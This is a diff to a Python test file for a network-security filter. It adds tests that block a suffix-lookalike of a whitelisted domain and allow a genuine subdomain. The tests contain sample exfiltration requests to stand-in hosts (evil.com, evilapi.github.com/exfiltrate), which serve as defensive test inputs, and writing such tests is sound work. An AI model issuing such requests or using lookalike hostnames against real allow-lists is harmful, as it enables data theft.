@@ -76,3 +76,22 @@ def test_blocks_bare_url_literal(default_policy: SecurityPolicy) -> None:
     code = 'data = "https://evil.com/exfiltrate?key=secret"'
     with pytest.raises(SecurityBlockedError):
         NetworkFilter(default_policy).validate(code)
+
+
+def test_blocks_suffix_lookalike_of_whitelisted_domain(
+    permissive_policy: SecurityPolicy,
+) -> None:
+    """A hostname merely ending in an allowed host must not pass the whitelist."""
+    code = 'requests.get("https://evilapi.github.com/exfiltrate")'
+
+    with pytest.raises(SecurityBlockedError):
+        NetworkFilter(permissive_policy).validate(code)
+
+
+def test_allows_a_real_subdomain_of_whitelisted_domain(
+    permissive_policy: SecurityPolicy,
+) -> None:
+    """Subdomains are permitted only when separated by a DNS label boundary."""
+    code = 'requests.get("https://api.api.github.com/status")'
+
+    NetworkFilter(permissive_policy).validate(code)
